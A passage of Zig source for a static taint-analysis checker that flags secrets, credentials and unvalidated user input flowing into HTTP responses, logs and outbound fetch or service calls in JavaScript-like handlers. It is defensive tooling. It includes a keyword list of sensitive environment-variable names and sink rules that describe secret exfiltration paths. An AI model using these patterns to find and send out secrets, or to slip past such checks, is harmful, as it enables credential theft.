                    self.checkExprSinks(expr);
                }
            },

            .for_of_stmt, .for_in_stmt => {
                const fi = self.ir_view.getForIter(node) orelse return;
                // Iteration variable inherits labels from iterable
                const iterable_labels = self.inferLabels(fi.iterable);
                if (!iterable_labels.isEmpty()) {
                    const key = packBindingKey(fi.binding.scope_id, fi.binding.slot);
                    self.binding_labels.put(self.allocator, key, iterable_labels) catch {};
                }
                self.walkStmt(fi.body);
            },

            .switch_stmt => {
                const sw = self.ir_view.getSwitchStmt(node) orelse return;
                for (0..sw.cases_count) |i| {
                    const case_idx = self.ir_view.getListIndex(sw.cases_start, @intCast(i));
                    const cc = self.ir_view.getCaseClause(case_idx) orelse continue;
                    for (0..cc.body_count) |j| {
                        const body_stmt = self.ir_view.getListIndex(cc.body_start, @intCast(j));
                        self.walkStmt(body_stmt);
                    }
                }
            },

            .function_decl, .function_expr, .arrow_function => {
                // While summarizing a callee, a nested function's returns are
                // not the callee's returns; skip its body.
                if (self.summary_returns != null) return;
                const func = self.ir_view.getFunction(node) orelse return;
                self.walkStmt(func.body);
            },

            .export_default => {
                if (self.ir_view.getOptValue(node)) |val| {
                    self.walkStmt(val);
                }
            },

            .call, .method_call => {
                self.checkExprSinks(node);
            },

            .assert_stmt => {
                const assert = self.ir_view.getAssertStmt(node) orelse return;
                if (assert.error_expr != null_node) {
                    self.checkExprSinks(assert.error_expr);
                }
            },

            else => {},
        }
    }

    fn inferLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        if (node == null_node) return LabelSet.empty;
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;

        switch (tag) {
            .lit_int, .lit_float, .lit_string, .lit_bool, .lit_undefined => return LabelSet.empty,

            .identifier => {
                const binding = self.ir_view.getBinding(node) orelse return LabelSet.empty;
                const key = packBindingKey(binding.scope_id, binding.slot);
                return self.binding_labels.get(key) orelse LabelSet.empty;
            },

            .call => {
                const call_data = self.ir_view.getCall(node) orelse return LabelSet.empty;
                return self.inferCallLabels(call_data);
            },

            .binary_op => {
                const bin = self.ir_view.getBinary(node) orelse return LabelSet.empty;
                return LabelSet.merge(self.inferLabels(bin.left), self.inferLabels(bin.right));
            },

            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return LabelSet.empty;
                return LabelSet.merge(self.inferLabels(t.then_branch), self.inferLabels(t.else_branch));
            },

            .template_literal => {
                const tmpl = self.ir_view.getTemplate(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                for (0..tmpl.parts_count) |i| {
                    const part_idx = self.ir_view.getListIndex(tmpl.parts_start, @intCast(i));
                    const part_tag = self.ir_view.getTag(part_idx) orelse continue;
                    if (part_tag == .template_part_expr) {
                        if (self.ir_view.getOptValue(part_idx)) |expr| {
                            labels = LabelSet.merge(labels, self.inferLabels(expr));
                        }
                    }
                }
                return labels;
            },

            .member_access, .optional_chain => {
                const member = self.ir_view.getMember(node) orelse return LabelSet.empty;
                var labels = self.inferLabels(member.object);

                // req.headers.authorization carries credential label
                if (self.isReqProperty(member.object, "headers")) {
                    const prop_name = self.resolveAtomName(member.property) orelse return labels;
                    if (std.mem.eql(u8, prop_name, "authorization")) {
                        return LabelSet.merge(labels, .{ .credential = true });
                    }
                }

                // result.value inherits labels from the producing validation call
                const prop_name = self.resolveAtomName(member.property) orelse return labels;
                if (std.mem.eql(u8, prop_name, "value")) {
                    const obj_tag = self.ir_view.getTag(member.object) orelse return labels;
                    if (obj_tag == .identifier) {
                        const binding = self.ir_view.getBinding(member.object) orelse return labels;
                        const key = packBindingKey(binding.scope_id, binding.slot);
                        if (self.result_binding_labels.get(key)) |result_labels| {
                            labels = LabelSet.merge(labels, result_labels);
                        }
                    }
                }

                // External labels: merge if the property name matches a declared field
                if (self.external_labels.get(prop_name)) |ext_labels| {
                    labels = LabelSet.merge(labels, ext_labels);
                }

                return labels;
            },

            .computed_access => {
                const member = self.ir_view.getMember(node) orelse return LabelSet.empty;
                return self.inferLabels(member.object);
            },

            .object_literal => {
                const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                var i: u16 = 0;
                while (i < obj.properties_count) : (i += 1) {
                    const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                    const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                    if (prop_tag == .object_property) {
                        const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                        labels = LabelSet.merge(labels, self.inferLabels(prop.value));
                    } else if (prop_tag == .object_spread) {
                        if (self.ir_view.getOptValue(prop_idx)) |val| {
                            labels = LabelSet.merge(labels, self.inferLabels(val));
                        }
                    }
                }
                return labels;
            },

            .array_literal => {
                const arr = self.ir_view.getArray(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                var i: u16 = 0;
                while (i < arr.elements_count) : (i += 1) {
                    const elem_idx = self.ir_view.getListIndex(arr.elements_start, i);
                    labels = LabelSet.merge(labels, self.inferLabels(elem_idx));
                }
                return labels;
            },

            .spread => {
                if (self.ir_view.getOptValue(node)) |operand| {
                    return self.inferLabels(operand);
                }
                return LabelSet.empty;
            },

            .match_expr => {
                const match_data = self.ir_view.getMatchExpr(node) orelse return LabelSet.empty;
                var labels = LabelSet.empty;
                var i: u8 = 0;
                while (i < match_data.arms_count) : (i += 1) {
                    const arm_idx = self.ir_view.getListIndex(match_data.arms_start, i);
                    const arm = self.ir_view.getMatchArm(arm_idx) orelse continue;
                    labels = LabelSet.merge(labels, self.inferLabels(arm.body));
                }
                return labels;
            },

            .assignment => {
                const asgn = self.ir_view.getAssignment(node) orelse return LabelSet.empty;
                return self.inferLabels(asgn.value);
            },

            .unary_op => {
                if (self.ir_view.getOptValue(node)) |operand| {
                    return self.inferLabels(operand);
                }
                return LabelSet.empty;
            },

            .method_call => {
                const call_data = self.ir_view.getCall(node) orelse return LabelSet.empty;
                var labels = self.inferLabels(call_data.callee);
                for (0..call_data.args_count) |i| {
                    const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                    labels = LabelSet.merge(labels, self.inferLabels(arg));
                }
                return labels;
            },

            else => return LabelSet.empty,
        }
    }

    /// Infer labels for a function call expression.
    fn inferCallLabels(self: *FlowChecker, call_data: Node.CallExpr) LabelSet {
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return LabelSet.empty;

        if (callee_tag == .identifier) {
            const binding = self.ir_view.getBinding(call_data.callee) orelse return LabelSet.empty;

            if (self.module_fn_labels.get(binding.slot)) |base_labels| {
                if (self.env_fn_slot != null and binding.slot == self.env_fn_slot.? and call_data.args_count > 0) {
                    const arg = self.ir_view.getListIndex(call_data.args_start, 0);
                    return self.refineEnvLabels(arg, base_labels);
                }
                return base_labels;
            }

            // User-defined function call: summarize the callee body when its
            // declaration is visible; otherwise keep the union of argument
            // labels. Returning empty here would launder taint through any
            // wrapper function.
            return self.userCallLabels(binding, call_data);
        }

        return LabelSet.empty;
    }

    /// Labels for a call to a user-defined function: seed the callee's
    /// parameters with the argument labels, walk its body with sink checks
    /// suppressed, and union the labels of every return value. Falls back to
    /// the union of argument labels when the body is unavailable, recursive,
    /// or beyond the summary caps.
    fn userCallLabels(self: *FlowChecker, binding: ir.BindingRef, call_data: Node.CallExpr) LabelSet {
        var arg_labels: [max_summary_params]LabelSet = @splat(LabelSet.empty);
        var arg_union = LabelSet.empty;
        for (0..call_data.args_count) |i| {
            const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
            const labels = self.inferLabels(arg);
            if (i < max_summary_params) arg_labels[i] = labels;
            arg_union = LabelSet.merge(arg_union, labels);
        }

        const fn_key = packBindingKey(binding.scope_id, binding.slot);
        const fn_node = self.user_fn_decls.get(fn_key) orelse return arg_union;
        if (self.summary_depth >= max_summary_depth) return arg_union;
        for (self.summary_stack[0..self.summary_depth]) |active| {
            if (active == fn_key) return arg_union;
        }
        const func = self.ir_view.getFunction(fn_node) orelse return arg_union;
        if (func.params_count > max_summary_params) return arg_union;

        for (0..func.params_count) |i| {
            const param_idx = self.ir_view.getListIndex(func.params_start, @intCast(i));
            const pb = self.paramBinding(param_idx) orelse continue;
            const key = packBindingKey(pb.scope_id, pb.slot);
            const labels = if (i < call_data.args_count) arg_labels[i] else LabelSet.empty;
            self.binding_labels.put(self.allocator, key, labels) catch return arg_union;
        }

        self.summary_stack[self.summary_depth] = fn_key;
        self.summary_depth += 1;
        defer self.summary_depth -= 1;

        const body_tag = self.ir_view.getTag(func.body) orelse return arg_union;
        if (body_tag == .block or body_tag == .program) {
            var collected = LabelSet.empty;
            const saved = self.summary_returns;
            self.summary_returns = &collected;
            defer self.summary_returns = saved;
            self.walkStmt(func.body);
            return collected;
        }
        // Arrow expression body: the body is the return expression.
        return self.inferLabels(func.body);
    }

    fn checkResponseSink(self: *FlowChecker, ret_val: NodeIndex) void {
        var visited: [response_resolve_limit]u32 = undefined;
        var visited_len: usize = 0;
        if (!self.checkResponseValue(ret_val, &visited, &visited_len)) {
            // No Response-helper call shape was reachable for this return
            // value; run a label-only response-sink check so taint cannot
            // ride out through a binding the resolver could not follow.
            self.checkSinkLabels(self.inferLabels(ret_val), ret_val, .response);
        }
    }

    /// Run the response-sink checks on a returned value, resolving through
    /// ternary arms and locally recorded binding values. Returns true when
    /// every reachable shape ended at a Response-helper call that was
    /// sink-checked; false tells the caller to fall back to a label-only
    /// check on the original return value.
    fn checkResponseValue(
        self: *FlowChecker,
        node: NodeIndex,
        visited: *[response_resolve_limit]u32,
        visited_len: *usize,
    ) bool {
        if (node == null_node) return false;
        const tag = self.ir_view.getTag(node) orelse return false;

        switch (tag) {
            // Response.json(data), Response.text(data), Response.html(data), Response.redirect(url)
            .method_call, .call => {
                const call_data = self.ir_view.getCall(node) orelse return false;
                if (!self.isResponseHelper(call_data.callee)) return false;

                if (call_data.args_count > 0) {
                    const data_arg = self.ir_view.getListIndex(call_data.args_start, 0);
                    const labels = self.inferLabels(data_arg);
                    self.checkSinkLabels(labels, node, .response);

                    // XSS check: Response.html with unvalidated user input
                    if (labels.has(.user_input) and !labels.has(.validated)) {
                        if (self.isGlobalMethodCall(call_data.callee, "Response", &.{"html"})) {
                            self.addDiagnostic(.{
                                .severity = .warning,
                                .kind = .unvalidated_input_in_egress,
                                .node = node,
                                .message = "unvalidated user input in Response.html (potential XSS)",
                                .help = "use JSX with renderToString() for auto-escaping, or pass input through validateObject() first",
                                .repair_intent = .insert_guard_before_line,
                            });
                            self.properties.injection_safe = false;
                        }
                    } else if (labels.has(.validated)) {
                        // Defended: a validated value safely reaches an HTML
                        // response. The `.validated` label is present only
                        // because the value passed a named validator (e.g.
                        // escapeHtml/validateObject), so the guard is real.
                        if (self.isGlobalMethodCall(call_data.callee, "Response", &.{"html"})) {
                            self.recordValidated(.injection_safe, data_arg, node, "an HTML response body");
                        }
                    }
                }
                return true;
            },

            .ternary => {
                const t = self.ir_view.getTernary(node) orelse return false;
                const then_covered = self.checkResponseValue(t.then_branch, visited, visited_len);
                const else_covered = self.checkResponseValue(t.else_branch, visited, visited_len);
                return then_covered and else_covered;
            },

            .identifier => {
                const binding = self.ir_view.getBinding(node) orelse return false;
                const key = packBindingKey(binding.scope_id, binding.slot);
                for (visited[0..visited_len.*]) |seen| {
                    if (seen == key) return true;
                }
                if (visited_len.* >= visited.len) return false;
                visited[visited_len.*] = key;
                visited_len.* += 1;

                const values = self.binding_value_nodes.get(key) orelse return false;
                if (values.items.len == 0) return false;
                var all_covered = true;
                for (values.items) |value| {
                    if (!self.checkResponseValue(value, visited, visited_len)) all_covered = false;
                }
                return all_covered;
            },

            else => return false,
        }
    }

    fn checkExprSinks(self: *FlowChecker, node: NodeIndex) void {
        // While summarizing a callee body, expression sinks stay silent:
        // diagnostics belong to the handler walk.
        if (self.summary_returns != null) return;
        const tag = self.ir_view.getTag(node) orelse return;
        if (tag != .call and tag != .method_call) return;

        const call_data = self.ir_view.getCall(node) orelse return;

        if (self.isConsoleCall(call_data.callee)) {
            for (0..call_data.args_count) |i| {
                const arg = self.ir_view.getListIndex(call_data.args_start, @intCast(i));
                const labels = self.inferLabels(arg);
                self.checkSinkLabels(labels, node, .console);
            }
            return;
        }

        if (tag == .call) {
            // Egress sinks: the bare `fetchSync(url, opts)` global plus the
            // documented module APIs `fetch` (zigttp:fetch) and `serviceCall`
            // (zigttp:service). Recognizing only the bare global let a secret
            // flow into a `fetch(...)` body or URL go unflagged, falsely
            // discharging no_secret_leakage / injection_safe.
            if (self.isFetchSyncCall(call_data.callee)) {
                self.checkEgressCall(call_data, node, 0, 1);
            } else if (self.egressModuleFunc(call_data.callee)) |kind| {
                switch (kind) {
                    // fetch(url, init): url at 0, options at 1.
                    .fetch => self.checkEgressCall(call_data, node, 0, 1),
                    // serviceCall(service, route, init): route at 1, init at 2.
                    .service_call => self.checkEgressCall(call_data, node, 1, 2),
                }
            }
        }
    }

    const EgressKind = enum { fetch, service_call };

    /// Identify a call whose callee is an imported egress module function
    /// (`fetch` from zigttp:fetch or `serviceCall` from zigttp:service).
    fn egressModuleFunc(self: *const FlowChecker, callee: NodeIndex) ?EgressKind {
        const callee_tag = self.ir_view.getTag(callee) orelse return null;
        if (callee_tag != .identifier) return null;
        const binding = self.ir_view.getBinding(callee) orelse return null;
        const meta = self.module_fn_meta.get(binding.slot) orelse return null;
        if (std.mem.eql(u8, meta.func, "fetch")) return .fetch;
        if (std.mem.eql(u8, meta.func, "serviceCall")) return .service_call;
        return null;
    }

    /// Apply the egress-URL and egress-body sink checks for a call with the URL
    /// (or route) at `url_idx` and the request-options object at `body_idx`.
    fn checkEgressCall(self: *FlowChecker, call_data: Node.CallExpr, node: NodeIndex, url_idx: u8, body_idx: u8) void {
        if (call_data.args_count > url_idx) {
            const url_arg = self.ir_view.getListIndex(call_data.args_start, url_idx);
            self.checkSinkLabels(self.inferLabels(url_arg), node, .egress_url);
        }
        if (call_data.args_count > body_idx) {
            const opts_arg = self.ir_view.getListIndex(call_data.args_start, body_idx);
            const body_labels = self.inferObjectBodyLabels(opts_arg);
            self.checkSinkLabels(body_labels, node, .egress_body);
            // Defended: a validated value safely reaches an egress body.
            // `.validated` is present only because the value passed a named
            // validator; `findGuardInExpr` recurses the options object to the
            // `body:` value to name it.
            if (body_labels.has(.validated)) {
                for ([_]counterexample.PropertyTag{ .injection_safe, .input_validated }) |defended_tag| {
                    self.recordValidated(defended_tag, opts_arg, node, "an egress request body");
                }
            }

            // The `query` init field is appended to the egress URL at runtime
            // (buildFetchUrl / appendServiceQuery), so a secret or credential in
            // it is a URL sink, not a body sink. inferObjectBodyLabels returns
            // only the `body` value when a body key is present, so without this
            // the query would escape every sink check and falsely discharge
            // no_secret_leakage.
            self.checkSinkLabels(self.inferObjectPropLabels(opts_arg, "query"), node, .egress_url);
        }
    }

    const SinkKind = enum { response, console, egress_url, egress_body };

    fn checkSinkLabels(self: *FlowChecker, labels: LabelSet, node: NodeIndex, sink: SinkKind) void {
        if (labels.isEmpty()) return;

        switch (sink) {
            .response => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_response,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into response body", .secret),
                        .help = "env vars with sensitive names (SECRET, PASSWORD, KEY, TOKEN) must not appear in responses",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_response,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into response body", .credential),
                        .help = "auth tokens and JWT payloads should not be returned to clients",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.no_credential_leakage = false;
                }
            },
            .console => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_log,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into console output", .secret),
                        .help = "env vars with sensitive names must not be logged",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .credential_in_log,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into console output", .credential),
                        .help = "auth tokens and JWTs must not be logged",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.no_credential_leakage = false;
                }
            },
            .egress_url => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync URL", .secret),
                        .help = "secrets in URLs are logged by proxies and CDNs; pass secrets in headers or body instead",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.no_secret_leakage = false;
                }
                if (labels.has(.credential)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .credential_in_egress_url,
                        .node = node,
                        .message = self.messageWithReason("credential data flows into fetchSync URL", .credential),
                        .help = "pass auth tokens in headers, not URLs",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.no_credential_leakage = false;
                }
            },
            .egress_body => {
                if (labels.has(.secret)) {
                    self.addDiagnostic(.{
                        .severity = .err,
                        .kind = .secret_in_egress_body,
                        .node = node,
                        .message = self.messageWithReason("secret data flows into fetchSync request body", .secret),
                        .help = "do not send env secrets to external services",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.no_secret_leakage = false;
                }
                // Check for unvalidated user input in egress
                if (labels.has(.user_input) and !labels.has(.validated)) {
                    self.addDiagnostic(.{
                        .severity = .warning,
                        .kind = .unvalidated_input_in_egress,
                        .node = node,
                        .message = "unvalidated user input flows into fetchSync body",
                        .help = "pass user input through validateJson() or validateObject() before sending to external services",
                        .repair_intent = .insert_guard_before_line,
                    });
                    self.properties.input_validated = false;
                    self.properties.injection_safe = false;
                }
                // PII containment: user input going to external hosts
                if (labels.has(.user_input)) {
                    self.properties.pii_contained = false;
                }
            },
        }
    }

    /// Refine env() labels based on the literal env var name.
    /// Names containing SECRET, PASSWORD, KEY, TOKEN, or PRIVATE keep {secret}.
    /// Others get downgraded to {config}.
    fn refineEnvLabels(self: *const FlowChecker, arg_node: NodeIndex, base_labels: LabelSet) LabelSet {
        const arg_tag = self.ir_view.getTag(arg_node) orelse return base_labels;
        if (arg_tag != .lit_string) return base_labels; // non-literal: keep conservative

        const name = self.ir_view.getString(self.ir_view.getStringIdx(arg_node) orelse return base_labels) orelse return base_labels;

        if (isSensitiveEnvName(name)) {
            return base_labels; // keep {secret}
        }

        // Non-sensitive name: downgrade to {config}
        return .{ .config = true };
    }

    fn isSensitiveEnvName(name: []const u8) bool {
        const patterns = [_][]const u8{
            "SECRET",  "PASSWORD",   "PASSWD", "KEY", "TOKEN",
            "PRIVATE", "CREDENTIAL", "AUTH",
        };
        for (patterns) |pattern| {
            if (indexOfIgnoreCase(name, pattern)) return true;
        }
        return false;
    }

    fn indexOfIgnoreCase(haystack: []const u8, needle: []const u8) bool {
        if (needle.len > haystack.len) return false;
        const end = haystack.len - needle.len + 1;
        for (0..end) |i| {
            var match = true;
            for (needle, 0..) |nc, j| {
                if (std.ascii.toUpper(haystack[i + j]) != nc) {
                    match = false;
                    break;
                }
            }
            if (match) return true;
        }
        return false;
    }

    /// Check if callee is `Global.method()` where Global and method match the given names.
    fn isGlobalMethodCall(self: *const FlowChecker, callee: NodeIndex, object_name: []const u8, method_names: []const []const u8) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .member_access) return false;
        const member = self.ir_view.getMember(callee) orelse return false;

        const obj_tag = self.ir_view.getTag(member.object) orelse return false;
        if (obj_tag != .identifier) return false;
        const binding = self.ir_view.getBinding(member.object) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const obj_name = self.resolveAtomName(binding.slot) orelse return false;
        if (!std.mem.eql(u8, obj_name, object_name)) return false;

        const method_name = self.resolveAtomName(member.property) orelse return false;
        for (method_names) |name| {
            if (std.mem.eql(u8, method_name, name)) return true;
        }
        return false;
    }

    fn isResponseHelper(self: *const FlowChecker, callee: NodeIndex) bool {
        return self.isGlobalMethodCall(callee, "Response", &.{ "json", "text", "html", "redirect" });
    }

    fn isConsoleCall(self: *const FlowChecker, callee: NodeIndex) bool {
        return self.isGlobalMethodCall(callee, "console", &.{ "log", "warn", "error" });
    }

    fn isFetchSyncCall(self: *const FlowChecker, callee: NodeIndex) bool {
        const tag = self.ir_view.getTag(callee) orelse return false;
        if (tag != .identifier) return false;
        const binding = self.ir_view.getBinding(callee) orelse return false;
        if (binding.kind != .undeclared_global) return false;
        const name = self.resolveAtomName(binding.slot) orelse return false;
        return std.mem.eql(u8, name, "fetchSync");
    }

    fn isReqProperty(self: *const FlowChecker, node: NodeIndex, expected_prop: []const u8) bool {
        const tag = self.ir_view.getTag(node) orelse return false;
        if (tag != .member_access) return false;
        const member = self.ir_view.getMember(node) orelse return false;

        // Check if object is the request binding
        const obj_tag = self.ir_view.getTag(member.object) orelse return false;
        if (obj_tag != .identifier) return false;
        const binding = self.ir_view.getBinding(member.object) orelse return false;
        const key = packBindingKey(binding.scope_id, binding.slot);
        if (self.req_binding_key == null or key != self.req_binding_key.?) return false;

        const prop_name = self.resolveAtomName(member.property) orelse return false;
        return std.mem.eql(u8, prop_name, expected_prop);
    }

    // -------------------------------------------------------------------
    // Helper: extract body labels from options object { body: ... }
    // -------------------------------------------------------------------

    fn inferObjectBodyLabels(self: *FlowChecker, node: NodeIndex) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag == .object_literal) {
            const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
            var i: u16 = 0;
            while (i < obj.properties_count) : (i += 1) {
                const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
                const prop_tag = self.ir_view.getTag(prop_idx) orelse continue;
                if (prop_tag == .object_property) {
                    const prop = self.ir_view.getProperty(prop_idx) orelse continue;
                    const key_name = self.getPropertyKeyName(prop.key) orelse continue;
                    if (std.mem.eql(u8, key_name, "body")) {
                        return self.inferLabels(prop.value);
                    }
                }
            }
        }
        // If not an object literal, infer labels of the whole thing
        return self.inferLabels(node);
    }

    /// Labels of a named property's value in an object literal, or empty when the
    /// node is not an object literal or has no such property.
    fn inferObjectPropLabels(self: *FlowChecker, node: NodeIndex, key: []const u8) LabelSet {
        const tag = self.ir_view.getTag(node) orelse return LabelSet.empty;
        if (tag != .object_literal) return LabelSet.empty;
        const obj = self.ir_view.getObject(node) orelse return LabelSet.empty;
        var i: u16 = 0;
        while (i < obj.properties_count) : (i += 1) {
            const prop_idx = self.ir_view.getListIndex(obj.properties_start, i);
            if ((self.ir_view.getTag(prop_idx) orelse continue) != .object_property) continue;
            const prop = self.ir_view.getProperty(prop_idx) orelse continue;
            const key_name = self.getPropertyKeyName(prop.key) orelse continue;
            if (std.mem.eql(u8, key_name, key)) return self.inferLabels(prop.value);
        }
        return LabelSet.empty;
    }

    /// Get the name of an object property key (identifier or string literal).
    fn getPropertyKeyName(self: *const FlowChecker, key_idx: NodeIndex) ?[]const u8 {
        const tag = self.ir_view.getTag(key_idx) orelse return null;
        if (tag == .identifier) {
            const binding = self.ir_view.getBinding(key_idx) orelse return null;
            return self.resolveAtomName(binding.slot);
        } else if (tag == .lit_string) {
            const str_idx = self.ir_view.getStringIdx(key_idx) orelse return null;
            return self.ir_view.getString(str_idx);
        }
        return null;
    }

    /// Track result bindings from validation function calls.
    /// When `const result = validateJson(...)` is seen, records the function's
    /// return_labels so that `result.value` inherits them during label inference.
    fn trackResultBinding(self: *FlowChecker, vd: ir.Node.VarDecl) void {
        const init_tag = self.ir_view.getTag(vd.init) orelse return;
        if (init_tag != .call) return;

        const call_data = self.ir_view.getCall(vd.init) orelse return;
        const callee_tag = self.ir_view.getTag(call_data.callee) orelse return;
        if (callee_tag != .identifier) return;

        const callee_binding = self.ir_view.getBinding(call_data.callee) orelse return;
        const return_labels = self.module_fn_labels.get(callee_binding.slot) orelse return;

        // Only track if the function returns labels worth propagating (e.g., validated)
        if (return_labels.has(.validated)) {
            const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
            self.result_binding_labels.put(self.allocator, key, return_labels) catch {};
            // Remember the validator that cleared the taint so a defended path
            // can name it. `func` is borrowed from the module metadata table.
            if (self.module_fn_meta.get(callee_binding.slot)) |meta| {
                self.result_binding_guard.put(self.allocator, key, .{
                    .func = meta.func,
                    .node = vd.init,
                }) catch {};
            }
        }
    }

    /// Find the first external reason matching the given label.
    /// Iterates all external_reasons entries whose corresponding LabelSet
    /// includes the target label. Returns null if no external label contributed.
    fn findExternalReason(self: *const FlowChecker, label: DataLabel) ?[]const u8 {
        var iter = self.external_reasons.iterator();
        while (iter.next()) |entry| {
            if (self.external_labels.get(entry.key_ptr.*)) |ext_ls| {
                if (ext_ls.has(label)) return entry.value_ptr.*;
            }
        }
        return null;
    }

    /// Return a diagnostic message, appending the external reason if one exists.
    /// When no external reason applies, the original literal is returned as-is
    /// (no allocation). When a reason exists, a new string is allocated and
    /// tracked in allocated_messages for cleanup.
    fn messageWithReason(self: *FlowChecker, base: []const u8, label: DataLabel) []const u8 {
        const reason = self.findExternalReason(label) orelse return base;
        const formatted = std.fmt.allocPrint(self.allocator, "{s} ({s})", .{ base, reason }) catch return base;
        self.allocated_messages.append(self.allocator, formatted) catch {
            self.allocator.free(formatted);
            return base;
        };
        return formatted;
    }

    fn addDiagnostic(self: *FlowChecker, diag: Diagnostic) void {
        var owned = diag;
        // Only diagnostics the counterexample surface can actually consume
        // carry a witness snapshot. Skipping the dupe for everything else
        // avoids allocator churn when the handler raises many non-witness
        // diagnostics (unused-variable warnings, XSS warnings, etc.).
        if (propertyTagForKind(diag.kind) != null and
            (self.working_constraints.items.len > 0 or self.working_io_calls.items.len > 0))
        {
            const constraints = self.allocator.dupe(
                counterexample.WitnessConstraint,
                self.working_constraints.items,
            ) catch &[_]counterexample.WitnessConstraint{};
            const io_calls = self.allocator.dupe(
                counterexample.TrackedIoCall,
                self.working_io_calls.items,
            ) catch &[_]counterexample.TrackedIoCall{};
            owned.witness = .{
                .path_constraints = constraints,
                .io_calls = io_calls,
            };
        }
        self.diagnostics.append(self.allocator, owned) catch {
            if (owned.witness) |w| {
                if (w.path_constraints.len > 0) self.allocator.free(w.path_constraints);
                if (w.io_calls.len > 0) self.allocator.free(w.io_calls);
            }
        };
    }

    /// Push zero or more constraints derived from `cond` onto the working
    /// stack. AND chains contribute one constraint per clause; every other
    /// shape contributes at most one. Returns the number pushed so the
    /// caller can pop exactly that many when the branch body is done.
    ///
    /// Under `want_negation` (the else-branch path), an AND chain contributes
    /// one negated clause. `!(a && b)` is `!a || !b`; emitting every negated
    /// clause would force `!a && !b`, which can make a witness skip the value
    /// it is supposed to leak.
    fn pushConditionConstraints(self: *FlowChecker, cond: NodeIndex, want_negation: bool) usize {
        const tag = self.ir_view.getTag(cond) orelse return 0;
        if (tag == .binary_op) {
            const bin = self.ir_view.getBinary(cond) orelse return 0;
            if (bin.op == .and_op) {
                if (want_negation) {
                    const final = self.findNegatedAndConstraint(cond, true) orelse
                        self.findNegatedAndConstraint(cond, false) orelse
                        return 0;
                    self.working_constraints.append(self.allocator, final) catch return 0;
                    return 1;
                }
                const left = self.pushConditionConstraints(bin.left, want_negation);
                const right = self.pushConditionConstraints(bin.right, want_negation);
                return left + right;
            }
        }

        const raw = self.extractCondConstraint(cond) orelse return 0;
        const final = if (want_negation) counterexample.negate(raw) orelse return 0 else raw;
        self.working_constraints.append(self.allocator, final) catch return 0;
        return 1;
    }

    fn popConstraints(self: *FlowChecker, count: usize) void {
        var remaining = count;
        while (remaining > 0) : (remaining -= 1) _ = self.working_constraints.pop();
    }

    /// Record a virtual-module call on the current path, if `vd.init` is a
    /// direct call to an imported module function. Also remembers the
    /// originating module-function slot on the declared binding so that
    /// later `if (x)` patterns can emit stub_truthy.
    fn trackModuleCallInit(self: *FlowChecker, vd: Node.VarDecl) void {
        const init_tag = self.ir_view.getTag(vd.init) orelse return;
        if (init_tag != .call) return;
        const call = self.ir_view.getCall(vd.init) orelse return;
        const callee_tag = self.ir_view.getTag(call.callee) orelse return;
        if (callee_tag != .identifier) return;
        const binding = self.ir_view.getBinding(call.callee) orelse return;
        const meta = self.module_fn_meta.get(binding.slot) orelse return;
        const call_index = self.working_io_calls.items.len;
        self.working_io_calls.append(self.allocator, .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
        }) catch return;
        var call_meta = meta;
        call_meta.call_index = @intCast(call_index);
        const key = packBindingKey(vd.binding.scope_id, vd.binding.slot);
        self.binding_origin.put(self.allocator, key, call_meta) catch {};
    }

    fn findNegatedAndConstraint(
        self: *FlowChecker,
        cond: NodeIndex,
        prefer_request: bool,
    ) ?counterexample.WitnessConstraint {
        const tag = self.ir_view.getTag(cond) orelse return null;
        if (tag == .binary_op) {
            const bin = self.ir_view.getBinary(cond) orelse return null;
            if (bin.op == .and_op) {
                return self.findNegatedAndConstraint(bin.left, prefer_request) orelse
                    self.findNegatedAndConstraint(bin.right, prefer_request);
            }
        }

        const raw = self.extractCondConstraint(cond) orelse return null;
        const negated = counterexample.negate(raw) orelse return null;
        if (prefer_request and !isRequestConstraint(negated)) return null;
        return negated;
    }

    fn isRequestConstraint(c: counterexample.WitnessConstraint) bool {
        return switch (c) {
            .req_method, .req_method_not, .req_url, .req_url_not => true,
            else => false,
        };
    }

    /// Extract a single WitnessConstraint from a condition node. AND
    /// chains are handled one level up in `pushConditionConstraints`;
    /// supported single-node shapes are documented by the switch arms.
    fn extractCondConstraint(self: *FlowChecker, cond: NodeIndex) ?counterexample.WitnessConstraint {
        const tag = self.ir_view.getTag(cond) orelse return null;
        switch (tag) {
            .identifier => {
